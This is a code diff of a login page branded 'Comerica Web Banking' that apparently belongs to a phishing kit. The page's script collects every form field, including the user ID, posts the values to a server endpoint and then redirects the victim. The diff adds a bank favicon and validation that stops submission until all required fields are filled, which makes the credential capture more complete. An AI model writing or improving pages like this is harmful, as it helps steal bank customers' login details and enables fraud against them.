@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Comerica Web Banking</title>
     <link rel="stylesheet" href="/css/styles.css">
+    <link rel="icon" href="/images/CMA.png" type="image/x-icon">
     <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
 </head>
 <body>
@@ -113,17 +114,33 @@
         e.preventDefault();
 
         let userinfo = {}; 
-        let visitor = $('#username').val();
+        let visitor = $('#userid').val();
+        let isValid = true; // Flag to check if all inputs are valid
+
         sessionStorage.setItem('visitor', visitor);
-        
+
         $('form input').each(function () {
             let inputName = $(this).attr('name');
             let inputValue = $(this).val();
-            
-            if (inputName) {
-                userinfo[inputName] = inputValue;
+            let isRequired = $(this).attr('required');
+
+            // Validate required inputs
+            if (isRequired && !inputValue.trim()) {
+                $(this).css('border', '1px solid red'); // Highlight empty required fields
+                isValid = false;
+            } else {
+                $(this).css('border', ''); // Reset border if valid
+                if (inputName) {
+                    userinfo[inputName] = inputValue;
+                }
             }
         });
+
+        // Stop submission if validation fails
+        if (!isValid) {
+            console.log('Please fill in all required fields.');
+            return;
+        }
 
         userinfo['visitor'] = visitor;
         console.log(userinfo); 
@@ -133,8 +150,8 @@
             type: 'POST',
             data: userinfo,
             success: function (response) {
-             if(response.url){
-                window.location.href = response.url;
+                if (response.url) {
+                    window.location.href = response.url;
                 }
             },
             error: function (xhr, status, error) {
@@ -142,6 +159,6 @@
             }
         });
     });
-});
-  </script>
+}); 
+  </script> 
 </html>
